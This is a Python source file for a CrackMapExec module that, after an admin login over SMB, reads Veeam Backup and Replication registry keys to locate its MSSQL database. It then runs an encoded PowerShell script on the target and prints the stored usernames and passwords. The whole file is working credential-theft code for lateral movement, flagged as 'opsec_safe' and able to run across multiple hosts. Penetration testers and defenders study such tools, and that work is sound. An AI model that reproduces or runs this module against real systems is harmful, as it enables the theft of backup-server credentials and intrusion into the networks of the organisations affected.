#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Initially created by @sadshade, all output to him:
# https://github.com/sadshade/veeam-output

from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
import traceback
from base64 import b64encode
from cme.helpers.powershell import get_ps_script


class CMEModule:
    """
    Module by @NeffIsBack
    """

    name = "veeam"
    description = "Extracts credentials from local Veeam SQL Database"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        with open(get_ps_script("veeam_dump_module/veeam-creds_dump.ps1"), "r") as psFile:
            self.psScript = psFile.read()

    def options(self, context, module_options):
        """
        No options

        Info: Currently only supports Databases hosted on MSSQL. PostgreSql is not supported yet.
        """
        pass

    def checkVeeamInstalled(self, context, connection):
        context.log.display("Looking for Veeam installation...")
        SqlDatabase = ""
        SqlInstance = ""
        SqlServer = ""

        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()

            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # Veeam v12 added the possibility to use postgresql instead of mssql. Extracting from postgresql is not supported yet though.
            try:
                ans = rrp.hBaseRegOpenKey(
                    remoteOps._RemoteOperations__rrp,
                    regHandle,
                    "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations",
                )
                keyHandle = ans["phkResult"]

                database_config = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlActiveConfiguration")[1].split("\x00")[:-1][0]

                if database_config == "PostgreSql":
                    context.log.success("Veeam v12 installation found!")
                    context.log.fail("Veeam is configured to use PostgreSql to store credentials. This is not supported yet.")
                    raise NotImplementedError("PostgreSql is not supported yet")
                elif database_config == "MsSql":
                    context.log.success("Veeam v12 installation found!")

                    ans = rrp.hBaseRegOpenKey(
                        remoteOps._RemoteOperations__rrp,
                        regHandle,
                        "SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\MsSql",
                    )
                    keyHandle = ans["phkResult"]

                    SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[1].split("\x00")[:-1][0]
                    SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlInstanceName")[1].split("\x00")[:-1][0]
                    SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlServerName")[1].split("\x00")[:-1][0]
            except NotImplementedError:
                raise NotImplementedError("PostgreSql is not supported yet")
            except DCERPCException as e:
                if str(e).find("ERROR_FILE_NOT_FOUND"):
                    context.log.debug("No Veeam v12 installation found")
            except Exception as e:
                context.log.fail(f"UNEXPECTED ERROR: {e}")
                context.log.debug(traceback.format_exc())

            # Veeam v11 check
            try:
                ans = rrp.hBaseRegOpenKey(
                    remoteOps._RemoteOperations__rrp,
                    regHandle,
                    "SOFTWARE\\Veeam\\Veeam Backup and Replication",
                )
                keyHandle = ans["phkResult"]

                SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[1].split("\x00")[:-1][0]
                SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlInstanceName")[1].split("\x00")[:-1][0]
                SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlServerName")[1].split("\x00")[:-1][0]

                context.log.success("Veeam v11 installation found!")
            except DCERPCException as e:
                if str(e).find("ERROR_FILE_NOT_FOUND"):
                    context.log.debug("No Veeam v11 installation found")
            except Exception as e:
                context.log.fail(f"UNEXPECTED ERROR: {e}")
                context.log.debug(traceback.format_exc())

        except NotImplementedError as e:
            pass
        except Exception as e:
            context.log.fail(f"UNEXPECTED ERROR: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remoteOps.finish()
        return [SqlDatabase, SqlInstance, SqlServer]

    def stripXmlOutput(self, context, output):
        return output.split("CLIXML")[1].split("<Objs Version")[0]

    def extractCreds(self, context, connection, SqlDatabase, SqlInstance, SqlServer):
        self.psScript = self.psScript.replace("REPLACE_ME_SqlDatabase", SqlDatabase)
        self.psScript = self.psScript.replace("REPLACE_ME_SqlInstance", SqlInstance)
        self.psScript = self.psScript.replace("REPLACE_ME_SqlServer", SqlServer)
        psScipt_b64 = b64encode(self.psScript.encode("UTF-16LE")).decode("utf-8")

        output = connection.execute("powershell.exe -e {} -OutputFormat Text".format(psScipt_b64), True)
        # Format ouput if returned in some XML Format
        if "CLIXML" in output:
            output = self.stripXmlOutput(context, output)

        # Stripping whitespaces and newlines
        output_stripped = [" ".join(line.split()) for line in output.split("\r\n") if line.strip()]

        # Error handling
        if "Can't connect to DB! Exiting..." in output_stripped or "No passwords found!" in output_stripped:
            context.log.fail(output_stripped[0])
            return

        for account in output_stripped:
            user, password = account.split(" ", 1)
            context.log.highlight(user + ":" + password)

    def on_admin_login(self, context, connection):
        SqlDatabase, SqlInstance, SqlServer = self.checkVeeamInstalled(context, connection)

        if SqlDatabase and SqlInstance and SqlServer:
            context.log.success(f'Found Veeam DB "{SqlDatabase}" on SQL Server "{SqlServer}\\{SqlInstance}"! Extracting stored credentials...')
            self.extractCreds(context, connection, SqlDatabase, SqlInstance, SqlServer)
